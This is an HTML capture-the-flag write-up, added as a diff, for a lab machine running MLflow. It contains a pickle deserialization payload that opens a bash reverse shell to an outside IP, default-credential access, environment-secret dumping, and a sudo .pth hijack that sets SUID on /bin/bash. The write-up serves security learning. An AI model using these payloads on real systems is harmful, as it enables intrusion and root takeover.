@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SmartHIRE Writeup // Rahul Sharma</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap">
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+
+<nav>
+  <div class="container nav-inner">
+    <div class="nav-logo"><a href="../index.html" style="color:inherit;">r4hul<span>@sec</span>:~$</a></div>
+    <div class="nav-links">
+      <a href="../index.html">home</a>
+      <a href="../writeups.html" class="active">writeups</a>
+      <a href="../blog.html">blog</a>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="page-header">
+    <div class="breadcrumb">
+      <a href="../index.html">~</a>
+      <span class="sep">/</span>
+      <a href="../writeups.html">writeups</a>
+      <span class="sep">/</span>
+      smarthire
+    </div>
+
+    <div style="display:flex;align-items:center;gap:16px;margin-bottom:16px;margin-top:16px;">
+      <div style="font-size:2.5rem;">🐧</div>
+      <div>
+        <h1 style="margin-bottom:6px;">SmartHIRE</h1>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+          <span class="badge badge-medium">Medium</span>
+          <span class="badge badge-linux">Linux</span>
+          <span class="badge badge-pwned">✓ Pwned</span>
+        </div>
+      </div>
+    </div>
+
+    <table style="width:auto;border-collapse:collapse;font-size:0.85rem;font-family:var(--font-mono);">
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Date</td>
+        <td style="padding:4px 0;color:var(--text);">2026-06-28</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">OS</td>
+        <td style="padding:4px 0;color:var(--text);">Ubuntu Linux</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Stack</td>
+        <td style="padding:4px 0;color:var(--text);">Flask + Gunicorn + nginx + MLflow 2.14.1</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">CVE</td>
+        <td style="padding:4px 0;color:var(--green);">CVE-2024-37054 (Pickle Deserialization RCE)</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="writeup-body">
+
+    <h2>Summary</h2>
+    <p>SmartHIRE is an AI-driven hiring platform. The attack chain involves two stages:</p>
+    <ol style="margin-left:20px;margin-bottom:16px;color:var(--text);">
+      <li style="margin-bottom:6px;"><strong>Initial access</strong> — Default MLflow credentials expose the model registry. CVE-2024-37054 allows overwriting a model's <code>python_model.pkl</code> with a malicious pickle payload, achieving RCE when the app loads the model.</li>
+      <li style="margin-bottom:6px;"><strong>Privilege escalation</strong> — A misconfigured sudo rule runs a Python script as root. The script calls <code>site.addsitedir()</code> on a user-writable plugin directory. Creating a malicious <code>.pth</code> file there triggers arbitrary code execution as root.</li>
+    </ol>
+
+    <h2>Reconnaissance</h2>
+
+    <h3>Web Application Mapping</h3>
+    <p>The target runs on port 80 (nginx → Gunicorn → Flask). JavaScript analysis of the dashboard revealed the following endpoints:</p>
+
+    <table>
+      <thead><tr><th>Endpoint</th><th>Method</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td><code>/register</code></td><td>POST</td><td>Create account (username, company, password)</td></tr>
+        <tr><td><code>/login</code></td><td>POST</td><td>Session login</td></tr>
+        <tr><td><code>/dashboard</code></td><td>GET</td><td>Model training UI</td></tr>
+        <tr><td><code>/upload_hiring_data</code></td><td>POST</td><td>Upload CSV to train ML model</td></tr>
+        <tr><td><code>/predict</code></td><td>POST</td><td>Upload CSV for predictions (loads the model)</td></tr>
+        <tr><td><code>/model_info</code></td><td>GET</td><td>Returns active model name &amp; version</td></tr>
+      </tbody>
+    </table>
+
+    <p>The Flask session cookie is an ItsDangerous-signed JSON blob:</p>
+    <pre>{"company": "TestCorp", "user_id": "507d6dfb8826", "username": "testuser"}</pre>
+
+    <p>Model naming pattern: <code>&lt;company&gt;-&lt;user_id&gt;-model</code> — the company name is user-controlled.</p>
+
+    <h3>MLflow Discovery</h3>
+    <p>The subdomain <code>models.smarthire.htb</code> hosts the MLflow UI. Default credentials work:</p>
+    <pre>curl -s -u admin:password http://models.smarthire.htb/
+# Returns: MLflow 2.14.1</pre>
+
+    <h2>Exploitation — CVE-2024-37054 (Pickle RCE)</h2>
+
+    <h3>What is Pickle Deserialization?</h3>
+    <p>Python's <code>pickle.loads()</code> doesn't just restore data — it executes Python opcodes. A crafted payload using <code>__reduce__</code> can run arbitrary OS commands the moment the object is deserialized:</p>
+
+    <pre>import pickle, os
+
+class Exploit(object):
+    def __reduce__(self):
+        cmd = 'bash -c "bash -i >& /dev/tcp/10.10.16.199/4444 0>&1"'
+        return (os.system, (cmd,))
+
+payload = pickle.dumps(Exploit())</pre>
+
+    <h3>Attack Steps</h3>
+    <p><strong>Step 1</strong> — Register an account so the app creates a model in MLflow.</p>
+    <p><strong>Step 2</strong> — Use the MLflow REST API to find and overwrite the model's <code>python_model.pkl</code> artifact with the malicious payload.</p>
+    <p><strong>Step 3</strong> — Start a listener:</p>
+    <pre>nc -nlvp 4444</pre>
+    <p><strong>Step 4</strong> — Trigger <code>/predict</code> → app calls <code>mlflow.pyfunc.load_model()</code> → pickle is deserialized → shell received.</p>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">initial foothold</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">kali</span>:~$ <span class="t-cmd">nc -nlvp 4444</span></div>
+        <div class="t-out">listening on [any] 4444 ...</div>
+        <div class="t-out">connect to [10.10.16.199] from (UNKNOWN) [10.10.x.x] 49812</div>
+        <div class="t-success">svcweb@smarthire:/var/www/smarthire.htb$</div>
+      </div>
+    </div>
+
+    <h2>Privilege Escalation — Python .pth Hijack</h2>
+
+    <h3>Enumeration</h3>
+    <pre>printenv    # reveals SMARTHIRE_SECRET_KEY, MLFLOW creds
+sudo -l</pre>
+
+    <p>The sudo rule:</p>
+    <pre>(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *</pre>
+
+    <h3>Vulnerable Script</h3>
+    <p>The script adds all subdirectories of <code>plugins/</code> to Python's module search path using <code>site.addsitedir()</code>:</p>
+
+    <pre>for path in PLUGINS_DIR.iterdir():
+    if path.is_dir():
+        site.addsitedir(str(path))  # adds core/ AND dev/ to sys.path</pre>
+
+    <p>The <code>dev/</code> plugin directory is writable by <code>svcweb</code>:</p>
+    <pre>drwxrwxr-x 2 root devs 4096 Jun 28 10:53 dev/</pre>
+
+    <h3>The .pth Trick</h3>
+    <p>Python's <code>site.addsitedir()</code> processes every <code>.pth</code> file it finds in the directory. Any line beginning with <code>import</code> is <strong>executed as Python code</strong> immediately — before any module imports happen.</p>
+
+    <p>Create the malicious <code>.pth</code> file:</p>
+    <pre>printf 'import os; os.system("chmod u+s /bin/bash")\n' \
+  > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth</pre>
+
+    <p>Trigger it as root:</p>
+    <pre>sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status</pre>
+
+    <p>Get root shell:</p>
+    <pre>/bin/bash -p
+whoami  # root</pre>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">root shell</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">svcweb@smarthire</span>:~$ <span class="t-cmd">sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status</span></div>
+        <div class="t-out">[*] Checking MLflow service status...</div>
+        <div class="t-out">[+] MLflow service status: active</div>
+        <br>
+        <div><span class="t-prompt">svcweb@smarthire</span>:~$ <span class="t-cmd">/bin/bash -p</span></div>
+        <div class="t-success">bash-5.1# whoami</div>
+        <div class="t-success">root</div>
+      </div>
+    </div>
+
+    <h2>Flags</h2>
+    <div class="flag-box">
+      <div class="flag-label">User Flag — /home/svcweb/user.txt</div>
+      <div class="flag-value">234fa6923c39eaca52baff7eca178bd8</div>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">Root Flag — /root/root.txt</div>
+      <div class="flag-value">ff6319d8dc2141c9a255032d25580912</div>
+    </div>
+
+    <h2>Findings Summary</h2>
+    <table>
+      <thead><tr><th>Finding</th><th>Severity</th><th>Impact</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>CVE-2024-37054: MLflow Pickle Deserialization RCE</td>
+          <td><span class="severity-critical">Critical</span></td>
+          <td>Remote Code Execution as web service user</td>
+        </tr>
+        <tr>
+          <td>Default MLflow Credentials (admin:password)</td>
+          <td><span class="severity-high">High</span></td>
+          <td>Full access to ML model registry</td>
+        </tr>
+        <tr>
+          <td>Sudo Python .pth File Privilege Escalation</td>
+          <td><span class="severity-critical">Critical</span></td>
+          <td>Local privilege escalation to root</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <h2>Key Lessons</h2>
+    <ul style="margin-left:20px;color:var(--text);line-height:2;">
+      <li><strong>Pickle = code execution.</strong> Never deserialize untrusted data. Protect artifact storage.</li>
+      <li><strong>Default credentials</strong> are as dangerous as hardcoded passwords.</li>
+      <li><strong><code>site.addsitedir()</code></strong> in privileged scripts is a hidden attack surface — .pth files execute code silently.</li>
+      <li><strong>Sudo wildcards</strong> need careful auditing. <code>*</code> at the end combined with user-writable paths = trivial privesc.</li>
+    </ul>
+
+    <div style="margin-top:48px;padding-top:24px;border-top:1px solid var(--border);">
+      <a href="../writeups.html" class="btn btn-ghost">&larr; Back to Writeups</a>
+    </div>
+
+  </div>
+</div>
+
+<br><br>
+<footer>
+  <div class="container">
+    <span>r4hul</span> // HTB Writeups &amp; Security Notes
+  </div>
+</footer>
+
+</body>
+</html>
